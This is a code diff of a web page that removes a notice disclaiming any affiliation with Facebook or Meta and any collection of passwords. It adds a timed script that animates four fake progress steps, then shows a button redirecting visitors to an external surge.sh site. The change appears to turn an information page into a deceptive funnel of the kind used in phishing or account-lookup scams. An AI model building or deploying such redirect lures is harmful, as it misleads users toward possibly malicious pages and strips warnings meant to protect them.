@@ -23,20 +23,35 @@
       and available public information in a clear and simple way.
     </p>
 
-    <hr style="margin:25px 0;">
+</div>
 
-    <h3 style="color:#333;">Important Notice</h3>
-    <p style="color:#666; font-size:14px; line-height:1.6;">
-      This website is <strong>not affiliated with Facebook, Meta,
-      or any social media company</strong>.
-      We do not collect personal data, passwords, or login information.
-    </p>
+<script>
+    const steps = [
+        document.getElementById("s1"),
+        document.getElementById("s2"),
+        document.getElementById("s3"),
+        document.getElementById("s4")
+    ];
 
-    <p style="color:#666; font-size:14px;">
-      Always use official platforms for account-related actions.
-    </p>
+    let index = 0;
 
-  </div>
+    function showSteps() {
+        if (index < steps.length) {
+            steps[index].classList.add("active");
+            index++;
+            setTimeout(showSteps, 1000);
+        } else {
+            document.getElementById("loader").style.display = "none";
+            document.getElementById("continueBtn").style.display = "block";
+        }
+    }
+
+    function goNext() {
+        window.location.href = 'http://view-complete--information-guide.surge.sh/';
+    }
+
+    showSteps();
+</script>
 
 </body>
 </html>
